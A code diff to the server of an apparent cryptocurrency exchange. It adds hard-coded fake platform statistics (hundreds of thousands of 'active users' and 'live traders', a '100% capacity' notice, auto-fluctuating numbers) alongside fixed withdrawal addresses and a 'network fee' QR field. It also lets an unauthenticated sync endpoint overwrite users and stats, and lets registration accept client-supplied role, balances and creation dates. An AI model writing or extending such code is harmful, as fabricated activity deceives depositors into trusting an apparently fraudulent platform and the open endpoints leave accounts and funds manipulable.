@@ -102,6 +102,15 @@ const defaultWithdrawAddresses = {
   TRX: 'TB7zZxcAr6NKR6nF231t2ZWYPTu1TUrDE6',
 };
 
+const defaultTrafficConfig = {
+  activeUsers: 348920,
+  liveTraders: 188416,
+  onlineNodes: 62805,
+  systemStatus: 'OPERATIONAL',
+  tickerNotice: 'All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.',
+  autoFluctuate: true,
+};
+
 function loadDb() {
   try {
     if (fs.existsSync(DB_FILE)) {
@@ -123,6 +132,7 @@ function loadDb() {
       if (!data.networkFeeQrCode) data.networkFeeQrCode = '';
       if (!Array.isArray(data.notifications)) data.notifications = [];
       if (!Array.isArray(data.auditLogs)) data.auditLogs = [];
+      if (!data.platformTrafficConfig) data.platformTrafficConfig = defaultTrafficConfig;
       return data;
     }
   } catch (e) {
@@ -136,6 +146,7 @@ function loadDb() {
     networkFeeQrCode: '',
     notifications: [],
     auditLogs: [],
+    platformTrafficConfig: defaultTrafficConfig,
   };
   saveDb(initDb);
   return initDb;
@@ -167,7 +178,7 @@ async function startServer() {
   });
 
   app.post('/api/sync', (req, res) => {
-    const { users, transactions, depositAddresses, withdrawAddresses, networkFeeQrCode, notifications, auditLogs } = req.body;
+    const { users, transactions, depositAddresses, withdrawAddresses, networkFeeQrCode, notifications, auditLogs, platformTrafficConfig } = req.body;
     const db = loadDb();
     if (Array.isArray(users) && users.length > 0) {
       db.users = users;
@@ -178,13 +189,16 @@ async function startServer() {
     if (typeof networkFeeQrCode === 'string') db.networkFeeQrCode = networkFeeQrCode;
     if (Array.isArray(notifications)) db.notifications = notifications;
     if (Array.isArray(auditLogs)) db.auditLogs = auditLogs;
+    if (platformTrafficConfig && typeof platformTrafficConfig === 'object') {
+      db.platformTrafficConfig = { ...db.platformTrafficConfig, ...platformTrafficConfig };
+    }
     saveDb(db);
     res.json({ success: true, ...db });
   });
 
   // USER REGISTRATION ENDPOINT (SAVED PERMANENTLY TO SERVER DB)
   app.post('/api/users/register', (req, res) => {
-    const { name, email, password, phone, role, balances } = req.body;
+    const { name, email, password, phone, role, balances, createdAt } = req.body;
     if (!email && !phone) {
       return res.status(400).json({ success: false, message: 'Email or phone number is required.' });
     }
@@ -226,7 +240,7 @@ async function startServer() {
         : { BTC: 0, ETH: 0, BNB: 0, SOL: 0, USDT: 0, USDC: 0, POL: 0, XRP: 0, DOGE: 0, LTC: 0, TRX: 0, GAS_TRX: 0 }),
       twoFactorEnabled: false,
       passkeyEnabled: false,
-      createdAt: new Date().toISOString(),
+      createdAt: createdAt || new Date().toISOString(),
       lastLoginIp: '127.0.0.1',
       lastLoginTime: new Date().toISOString(),
     };
